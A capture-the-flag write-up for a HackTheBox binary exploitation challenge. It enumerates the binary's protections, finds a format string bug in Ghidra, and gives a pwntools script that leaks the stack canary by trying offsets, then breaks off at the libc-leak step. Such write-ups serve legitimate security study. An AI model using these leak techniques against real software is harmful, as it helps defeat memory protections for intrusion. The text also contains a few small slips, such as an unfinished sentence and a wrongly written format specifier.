---
description: >-
  Good challenge that uses the format string vulnerability, with a fully
  protected binary.
---

# What does the F Say (HTB)

## Enumeration

There's one binary present from this challenge:

{% code overflow="wrap" %}
```
$ file what_does_the_f_say 
what_does_the_f_say: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dd622e290e6b1ac53e66369b85805ccd8a593fd0, for GNU/Linux 3.2.0, not stripped
```
{% endcode %}

We can run `checksec` on this to see its protections:

```
gdb-peda$ checksec
Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled off'.

Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.
Use 'set logging enabled on'.

CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

This binary has ASLR enabled, a Stack Canary (meaning that the , full RELRO (meaning we can't write to the GOT table to change where the `system` function is) and also has a non-executable stack (meaning we can't just inject shellcode, we need to use some ROP chaning somehow).&#x20;

The stack canary means there's some form of stack protection in place. The `rax` value is compared to the Stack Canary value to see if there's been tampering done to the binary. If there is, the application exits.

## Ghidra

We can take a look at the code within `ghidra` to get a better idea of what vulnerabilities are present. Within the `drinks_menu` table, there's a Format String vulnerability:

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

`local_38` is a variable that is user controlled and given a buffer of 40 bytes. It is then directly passed into a `printf` statement, meaning that we can use `%x` to print out values on the stack.

```
$ ./what_does_the_f_say 

Welcome to Fox space bar!

Current space rocks: 69.69

1. Space drinks
2. Space food
1

1. Milky way (4.90 s.rocks)
2. Kryptonite vodka (6.90 s.rocks)
3. Deathstar(70.00 s.rocks)
2

Red or Green Kryptonite?
%x
af28bb30
```

The `warning` function has a buffer overflow vulnerability, since it uses `strcmp` to compare a user-controlled string input.

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

So there 2 things we need to do:

1. Use the format string vulnerability to leak the stack canary.
2. Use the format string vulnerability to leak the base address of the `libc` library and where it is loaded.
3. Afterwards, abuse Ret2Libc to defeat NX.

## Exploitation

### Leaking Canary

In Linux binaries, the canaries always end with `00`. We can create a simple `for` loop with `pwntools` to the different 'positions' using `$x%p`. `x` in this case is a whole number, and it indicates which 'position' we are leaking (for example, `$7%p` would point to the 7th position).&#x20;

```python
from pwn import *

def canary():
	for i in range(1, 50):
		p = process('./what_does_the_f_say')
		p.recv()
		p.sendline("1")
		p.recv()
		p.sendline("2")
		p.recv()
		p.sendline(f"%{i}$p")	
		print(f"Offset: {i}")
		print(p.recv())
		p.close()

def main():
	canary()
	#libc()
	#shell()

main()
```

We can pipe the output to a file and read the address retrieved from each position. I found that the offset of 23 returned an address ending with 00, which means it must be the stack canary!

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Leaking Libc

